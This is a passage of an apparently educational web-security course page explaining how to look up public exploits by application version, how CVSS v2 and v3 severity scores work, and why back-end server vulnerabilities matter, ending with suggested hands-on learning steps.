+<p>Tip: The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.</p>
+<p>Once we identify the web application version, we can search Google for public exploits for this version of the web application. We can also utilize online exploit databases, like <a href="https://www.exploit-db.com/">Exploit DB</a>, <a href="https://www.rapid7.com/db/">Rapid7 DB</a>, or <a href="https://www.vulnerability-lab.com/">Vulnerability Lab</a>. The following example shows a search for WordPress public exploits in <a href="https://www.rapid7.com/db/">Rapid7 DB</a>:</p>
+<p><img src="storage\modules\75\rapid7-db.jpg" alt=""></p>
+<p>We would usually be interested in exploits with a CVE score of 8-10 or exploits that lead to <code>Remote Code Execution</code>. Other types of public exploits should also be considered if none of the above is available.</p>
+<p>Furthermore, these vulnerabilities are not exclusive to web applications and apply to components utilized by the web application. If a web application uses external components (e.g., a plugin), we should also search for vulnerabilities for these external components.</p>
+<hr>
+<h3 id="common-vulnerability-scoring-system-cvss-">Common Vulnerability Scoring System (CVSS)</h3>
+<p>The <a href="https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System">Common Vulnerability Scoring System (CVSS)</a> is an open-source industry standard for assessing the severity of security vulnerabilities. This scoring system is often used as a standard measurement for organizations and governments that need to produce accurate and consistent severity scores for their systems' vulnerabilities. This helps with the prioritization of resources and the response to a given threat.</p>
+<p>CVSS scores are based on a formula that uses several metrics: <code>Base</code>, <code>Temporal</code>, and <code>Environmental</code>. When calculating the severity of a vulnerability using CVSS, the <code>Base</code> metrics produce a score ranging from 0 to 10, modified by applying <code>Temporal</code> and <code>Environmental</code> metrics. The <a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a> provides CVSS scores for almost all known, publicly disclosed vulnerabilities. At this time, the NVD only provides <code>Base</code> scores based upon a given vulnerability's inherent characteristics. The current scoring systems in place are CVSS v2 and CVSS v3. There are several differences between the v2 and v3 systems, namely changes to the <code>Base</code> and <code>Environmental</code> groups to account for additional metrics. More information about the differences between the two scoring systems can be found <a href="https://www.balbix.com/insights/cvss-v2-vs-cvss-v3">here</a>.</p>
+<p>CVSS scoring ratings differ slightly between V2 and V3 as can be seen in the following tables:</p>
+<table>
+<thead>
+<tr>
+<th>CVSS V2.0 Ratings</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td><strong>Base Score Range</strong></td>
+</tr>
+<tr>
+<td>Low</td>
+<td>0.0-3.9</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>4.0-6.9</td>
+</tr>
+<tr>
+<td>High</td>
+<td>7.0-10.0</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th><strong>CVSS V3.0 Ratings</strong></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td><strong>Base Score Range</strong></td>
+</tr>
+<tr>
+<td>None</td>
+<td>0.0</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>0.1-3.9</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>4.0-6.9</td>
+</tr>
+<tr>
+<td>High</td>
+<td>7.0-8.9</td>
+</tr>
+<tr>
+<td>Critical</td>
+<td>9.0-10.0</td>
+</tr>
+</tbody>
+</table>
+<p>The NVD does not factor in <code>Temporal</code> and <code>Environmental</code> metrics because the former can change over time due to external events. The latter is a customized metric based on the potential impact of the vulnerability on a given organization. The NVD provides a <a href="https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator">CVSS v2 calculator</a> and a <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">CVSS v3 calculator</a> that organizations can use to factor additional risk from <code>Temporal</code> and <code>Environmental</code> data unique to them. The calculators are very interactive and can be used to fine-tune the CVSS score to our environment. We can move over each metric to read more about it and determine exactly how it applies to our organization. Below is an example view of the CVSS v3 calculator:</p>
+<p><img src="storage\modules\75\cvssv3_calc.png" alt="image"></p>
+<p>Play around with the CVSS calculator and see how the various metrics can be adjusted to arrive at a given score. Review some CVEs and attempt to arrive at the same CVSS score. How does the CVSS score change when you apply <code>Temporal</code> and <code>Environmental</code> metrics? This handy <a href="https://www.first.org/cvss/user-guide">guide</a> is extremely useful for understanding V2 and V3 and how to use the calculators to arrive at a given score.</p>
+<hr>
+<h3 id="back-end-server-vulnerabilities">Back-end Server Vulnerabilities</h3>
+<p>Like public vulnerabilities for web applications, we should also consider looking for vulnerabilities for other back end components, like the back end server or the webserver.</p>
+<p>The most critical vulnerabilities for back-end components are found in web servers, as they are publicly accessible over the <code>TCP</code> protocol. An example of a well-known web server vulnerability is the <code>Shell-Shock</code>, which affected Apache web servers released during and before 2014 and utilized <code>HTTP</code> requests to gain remote control over the back-end server.</p>
+<p>As for vulnerabilities in the back-end server or the database, they are usually utilized after gaining local access to the back-end server or back-end network, which may be gained through <code>external</code> vulnerabilities or during internal penetration testing. They are usually used to gain high privileged access on the back-end server or the back-end network or gain control over other servers within the same network.</p>
+<p>Although not directly exploitable externally, these vulnerabilities are still critical and need to be patched to protect the entire web application from being compromised.</p>
+<h2 id="next-steps">Next Steps</h2>
+<hr>
+<p>In this module, we have learned some, but by no means all, web application basics. We should now have a fundamental understanding of how a web application is built, how it works, and what dangers it can introduce into a corporate environment.</p>
+<p>It is important to take a hands-on approach to develop our understanding further and apply the topics taught in this module. We recommended reviewing the material in combination with developing a small web application. Some next steps that can be taken are:</p>
+<table data-header-hidden=""><thead><tr><th width="102"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>To-Do</strong></td></tr><tr><td><code>1.</code></td><td>Set up a VM with a web server</td></tr><tr><td><code>2.</code></td><td>Create an <code>HTML</code> page</td></tr><tr><td><code>3.</code></td><td>Design it with <code>CSS</code></td></tr><tr><td><code>4.</code></td><td>Add some simple functions with <code>JavaScript</code></td></tr><tr><td><code>5.</code></td><td>Program a simple web application</td></tr><tr><td><code>6.</code></td><td>Connect your web application to the database</td></tr><tr><td><code>7.</code></td><td>Experiment with APIs</td></tr><tr><td><code>8.</code></td><td>Test your application for various vulnerabilities and security holes</td></tr><tr><td><code>9.</code></td><td>Try to adjust your code and configurations to close the vulnerabilities</td></tr></tbody></table>
+
+<p>Developing a small web application will provide a much deeper understanding of the structure and functionality. Learning how to set up and manage such a web server, the database's role, and how the individual pieces of code are linked together is an invaluable experience.</p>
+</div></body></html>
